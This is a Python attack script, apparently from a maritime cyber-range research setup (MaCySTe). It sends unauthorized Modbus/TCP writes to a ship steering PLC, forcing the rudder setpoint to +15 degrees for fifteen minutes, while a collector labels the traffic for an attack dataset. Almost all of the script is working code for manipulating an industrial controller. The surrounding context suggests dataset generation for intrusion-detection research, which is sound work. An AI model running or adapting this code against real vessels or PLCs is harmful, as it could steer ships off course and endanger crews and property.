#!/usr/bin/env python3
"""
T0855 - Unauthorized Command: Rudder Setpoint Manipulation +15°
SGS master PLC rudder register'ına yazılır - container içinden çalıştırılır
Kullanım: podman exec macyste-openplc-sgs-master-openplc python3 /tmp/attack_t0855_rudder.py
"""
import time, subprocess, struct, sys

DURATION = 900
RECOVERY = 120
TARGET_IP = "10.1.3.6"
TARGET_PORT = 502
OUTPUT = "/root/MaCySTe/grad_rl_data/attack_data.csv"
COLLECTOR = "/root/MaCySTe/macyste_collector.py"

def run_collector(label, duration):
    cmd = ["python3", COLLECTOR, "--label", label,
           "--duration", str(duration), "--output", OUTPUT, "--append"]
    print(f"[COLLECTOR] label={label} duration={duration}s")
    return subprocess.Popen(cmd)

def write_rudder(client, value=15.0):
    # IEEE754 float -> 2 registers (little endian)
    b = struct.pack("<f", value)
    lo = struct.unpack("<H", b[0:2])[0]
    hi = struct.unpack("<H", b[2:4])[0]
    client.write_registers(4, [lo, hi], slave=1)

print("[T0855] Rudder Manipulation +15 derece basliyor...")

try:
    from pymodbus.client.sync import ModbusTcpClient
except ImportError:
    from pymodbus.client import ModbusTcpClient

collector = run_collector("t0855_rudder_manip", DURATION)
end_time = time.time() + DURATION
count = 0

try:
    client = ModbusTcpClient(TARGET_IP, port=TARGET_PORT)
    if not client.connect():
        print(f"[ERROR] {TARGET_IP}:{TARGET_PORT} baglanamadi")
        sys.exit(1)

    while time.time() < end_time:
        write_rudder(client, 15.0)
        count += 1
        time.sleep(2.0)
        if count % 30 == 0:
            print(f"[ATTACK] {count} write, kalan={int(end_time-time.time())}s")

    client.close()
except Exception as e:
    print(f"[ERROR] {e}")

collector.wait()
print(f"[RECOVERY] {RECOVERY}s...")
run_collector("recovery", RECOVERY).wait()
print(f"[DONE] {count} Modbus write yapildi")
